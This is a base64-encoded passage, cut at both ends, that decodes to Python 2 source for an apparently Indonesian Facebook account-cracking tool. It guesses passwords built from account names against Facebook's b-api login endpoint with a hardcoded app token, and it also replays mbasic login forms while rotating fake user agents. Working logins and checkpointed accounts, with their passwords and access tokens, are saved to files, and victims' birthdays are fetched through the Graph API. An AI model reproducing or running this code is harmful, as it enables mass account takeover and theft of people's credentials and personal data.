ZWxmKToNCiAgICAJZ2xvYmFsIHB3eA0KICAgICAgICBzdXV1ID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiVzICclKFAsTyxNLEspKQ0KICAgICAgICBpZiBzdXV1ID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5sYW5nc3VuZygpDQogICAgICAgIGVsaWYgc3V1dSBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgIAlmb3IgYWt1biBpbiBzZWxmLmlkOiANCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICBwdyA9IGFrdW4uc3BsaXQoJzw9PicpWzFdDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdyBpbiBwdy5zcGxpdCgiICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih3KTwzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXc9dy5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXB3eCA9IENvbWJpbmF0aW4ocHcpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYuYl9hcGksIHVzZXIsIHB3eCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICBlbGlmIHN1dXUgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAJZm9yIGFrdW4gaW4gc2VsZi5pZDogDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHcgPSBha3VuLnNwbGl0KCc8PT4nKVsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHcgaW4gcHcuc3BsaXQoIiAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odyk8MzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAl3PXcubG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAlwd3ggPSBDb21iaW5hdGluKHB3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCB1c2VyLCBwd3gpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgZWxpZiBzdXV1IGluICgnMycsICcwMycpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgCWZvciBha3VuIGluIHNlbGYuaWQ6IA0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHB3ID0gYWt1bi5zcGxpdCgnPD0+JylbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB3IGluIHB3LnNwbGl0KCIgIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHcpPDM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJdz13Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJcHd4ID0gQ29tYmluYXRpbihwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5tb2JpbCwgdXNlciwgcHd4KQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLmxhbmdzdW5nKCkNCiAgICMgQl9BUEkNCiAgICBkZWYgYl9hcGkoc2VsZiwgdXNlciwgbWFudWFsKToNCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAgICAgZm9yIHB3IGluIG1hbnVhbDoNCiAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICB1YV9waSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgaGVhZGVyID0geyJ1c2VyLWFnZW50IjogdWFfcGksIngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwzMDAwMDAwMC4wKSksIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCw0MDAwMCkpLCJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9mb3JtYXQ9anNvbiZlbWFpbD0nK3N0cih1c2VyKSsnJnBhc3N3b3JkPScrc3RyKHB3KSsnJmNyZWRlbnRpYWxzX3R5cGU9ZGV2aWNlX2Jhc2VkX2xvZ2luX3Bhc3N3b3JkJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJmVycm9yX2RldGFpbF90eXBlPWJ1dHRvbl93aXRoX2Rpc2FibGVkJnNvdXJjZT1kZXZpY2VfYmFzZWRfbG9naW4mbWV0YV9pbmZfZmJtZXRhPSUyMCZjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZD0wJm1ldGhvZD1HRVQmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX2NhbGxlcl9jbGFzcz1jb20uZmFjZWJvb2suZm9zLmhlYWRlcnN2Mi5mYjRhb3JjYS5IZWFkZXJzVjJDb25maWdGZXRjaFJlcXVlc3RIYW5kbGVyJmFjY2Vzc190b2tlbj0zNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzImZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPWF1dGhlbnRpY2F0ZSZjcGw9dHJ1ZScsIGhlYWRlcnM9aGVhZGVyKS50ZXh0DQogICAgICAgICAgICBpZiAiQW5kYSBUaWRhayBEYXBhdCBNZW5nZ3VuYWthbiBGaXR1ciBJbmkgU2VrYXJhbmciIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgCWxvb3AgKz0xDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcclwwMzNbMDs5MW3igKIgSVAgdGVyYmxva2lyLiBoaWR1cGthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayIpLA0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgICAgIHNlbGYuYl9hcGkodXNlciwgbWFudWFsKQ0KICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZSBhbmQgJ0VBQUEnIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnICUgKEgsdXNlcixwdyxyZXNwb25zZS5qc29uKClbJ2FjY2Vzc190b2tlbiddKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcscmVzcG9uc2UuanNvbigpWydhY2Nlc3NfdG9rZW4nXSkpDQogICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyUod2FrdHUpLCAnYScpLndyaXRlKCcgKi0tPiAlcyDil4ogJXMg4peKICVzXG4nJSh1c2VyLHB3LHJlc3BvbnNlLmpzb24oKVsnYWNjZXNzX3Rva2VuJ10pKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgCSAgICB5ZWFyICA9ICcnDQogICAgICAgICAgICAgICAgCWV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgIAlzZWxmLmNyM2NrKHVzZXIscHcpDQogICAgICAgICAgICAgICAgCWNwLmFwcGVuZCgnJXMg4peKICVzJyUodXNlcixwdykpDQogICAgICAgICAgICAgICAgCW9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICJna19tdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1c2VyLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgICAgIAkgICAgY3AuYXBwZW5kKCIlcyDil4ogJXMg4peKICVzICVzICVzIiUodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzXG4iJSAodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBicmVhaw0KICAgICAgICAgICAgICAgIAlleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgCSAgICBkYXkgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBNQkFTSUMNCiAgICBkZWYgYmFzaWMoc2VsZiwgdXNlciwgbWFudWFsLCoqZGF0YSk6DQogICAgCWdsb2JhbCBvayxjcCxsb29wDQogICAgCWlmICJyYW5kb20iIGluIHNlbGYudWdlbjoNCiAgICAJICAgIHRyeToNCiAgICAJICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICAJdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGVsaWYgImdrX3JhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgICAgICAJdHJ5Og0KICAgICAgICAJICAgIHVhID0gb3BlbigndWEudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJICAgIHVhID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KICAgICAgICBmb3IgcHcgaW4gbWFudWFsOiAgDQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwiZG50IjoiMSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoibm9uZSIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tLyIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcCA9IHNlcy5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGJykudGV4dA0KICAgICAgICAgICAgZGF0YWEgPXsibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksInVpZCI6dXNlciwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQ0KICAgICAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYW